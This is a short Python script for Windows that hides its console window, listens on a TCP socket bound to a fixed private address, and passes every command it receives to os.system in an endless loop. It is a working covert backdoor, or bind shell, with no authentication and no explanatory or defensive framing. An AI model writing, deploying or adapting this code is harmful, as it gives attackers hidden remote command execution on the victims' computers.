import win32console
import win32gui
import socket
import os

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0) 

host = '192.168.179.54'
port = 1

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
client, addr = s.accept()

while True:
    cmd = client.recv(1024)
    os.system(cmd.decode())